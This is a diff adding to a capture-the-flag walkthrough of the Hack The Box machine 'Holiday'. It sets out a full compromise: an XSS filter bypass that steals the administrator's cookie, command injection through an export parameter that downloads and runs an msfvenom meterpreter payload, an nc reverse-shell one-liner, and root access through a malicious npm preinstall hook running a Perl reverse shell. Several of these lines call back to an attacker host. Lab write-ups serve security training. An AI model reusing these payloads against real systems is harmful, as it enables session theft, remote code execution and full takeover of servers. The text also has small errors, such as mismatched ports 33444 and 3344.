@@ -1,5 +1,7 @@
 # Holiday -- hack the box
 
+![EvqqqH.png](https://s2.ax1x.com/2019/05/20/EvqqqH.png)
+
 ## Introduction
 
 Target: 10.10.10.25(Linux)
@@ -101,6 +103,8 @@ Login with this user. It seems to be a booking website.
 
 Click any booking and see the booking details. It consits of two tabs, including View and Notes. In the Notes, one word is interesting: "All notes must be approved by an administrator - this process can take up to 1 minute." Administrator is always attractive to hackers. It seems that the note will be approved by administrator. So it's possible to steal the session cokie of administrator if there is a xss vulnerability in the note edit form. I think it's the hardest part of this box. It's not easy to find the approprivate pass way. There is a way to utilize `fromCharCode` and other skills to pass the xss filter. The following javascript code is utilized to generate the payload:
 
+![EjjOxK.png](https://s2.ax1x.com/2019/05/19/EjjOxK.png)
+
 ```javascript
 var url = 'http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65';
 var str = `$.ajax({method:'GET',url:'${url}',success:function(data){$.post('http://10.10.16.65',data)}})`;
@@ -120,11 +124,84 @@ Set kali listen to port 80: `nc -lvnp 80`. The code can be run in the chrome dev
 
 ![Ej5nUO.png](https://s2.ax1x.com/2019/05/19/Ej5nUO.png)
 
-![EjjOxK.png](https://s2.ax1x.com/2019/05/19/EjjOxK.png)
-
-admin cookie
+The cookie of the administrator is obtained which is html encoded. Decode it with burp. And chage the cookie in the storage of firefox. Refesh the web page. Now you can hijack the administrator session cookie. Access to `http://10.10.10.25:8000/admin`. There seems nothing special except two buttons, including: Booking and Notes. 
 
 ![Ej4oE8.png](https://s2.ax1x.com/2019/05/19/Ej4oE8.png)
 
+After some exploration, you will find that there are command injection in the two function url. You can try to access `http://10.10.10.25:8000/admin/export?table=notes%26ls`. You can found the directories in the exported file. One thing should be noticed, as `&` has been prohibited. So you can pass this by `%26`. Hence, it seems that the table name exits RCE. But it's limited to charaters, numbers and `/`. So you should try to RCE by these. It's not possible to use command to obtain reverse shell by command. For example, `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`. As many characters is not allowed.
 
-https://www.ipaddressguide.com/ip
+![Ev7Txg.png](https://s2.ax1x.com/2019/05/20/Ev7Txg.png)
+
+Utilize msfvenom to generate the payload:
+
+```
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.16.65 LPORT=1234 -f elf > shell
+```
+
+Then upload the shell to the victim and execute it. As you are not allowed to use `.`. So convert IP address to decimal by [this website](https://www.ipaddressguide.com/ip). Access the following urls to execute the corresponding commands:
+
+* upload shell: `http://10.10.10.25:8000/admin/export?table=notes%26cd%20/tmp%20%26%26wget%20168431681/shell`
+* change permission: `http://10.10.10.25:8000/admin/export?table=notes%26chmod%20777%20/tmp/shell`
+* execute shell: `http://10.10.10.25:8000/admin/export?table=notes%26cd%20/tmp/shell`
+
+Before running the shell, you should set meterpreter in Kaili.
+
+```
+use exploit/multi/handler
+set LHOST 10.10.16.65
+set LPORT 1234
+set payload linux/x86/meterpreter/reverse_tcp
+run
+```
+
+Then, we get the shell!
+
+![Evb1cF.png](https://s2.ax1x.com/2019/05/20/Evb1cF.png)
+
+![EvbGnJ.png](https://s2.ax1x.com/2019/05/20/EvbGnJ.png)
+
+## Privilege escalation
+
+Check the sudo premission firstly: `sudo -l`. You will find the user has the permission to execute `sudo npm i`. [rimrafall](https://github.com/joaojeronimo/rimrafall) this repository has describle that npm install may be dangerous. It can be utilized to execute commands. You can upload the directory to the victim or create one by yourself.
+
+```
+cd app
+mkdir rimrafall
+cd rimrafall
+echo "module.exports = "install my be dangerousr"" > index.js
+```
+
+Create the `package.json` and upload it to the target directory. `preinstall` can be utilized to execute command. I have found that some command to obtain reverse shell is not useful. As perl is install in the machine. And create a file called prel3 to obtain the reverse shell.
+
+```
+
+{
+  "name": "rimrafall",
+  "version": "1.0.0",
+  "description": "rm -rf /* # DO NOT INSTALL THIS",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "perl prel3"
+  },
+  "keywords": [
+    "rimraf",
+    "rmrf"
+  ],
+  "author": "João Jerónimo",
+  "license": "ISC"
+}
+```
+
+```
+#prel3
+use Socket;$i="10.10.16.65";$p=3344;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
+```
+
+Set kali listen to port 33444: `nc -lvnp 3344`. In the victim, execute by: `sudo npm i rimrafall`. Now, we are root!
+
+![EvqfaR.png](https://s2.ax1x.com/2019/05/20/EvqfaR.png)
+
+
+
+
+
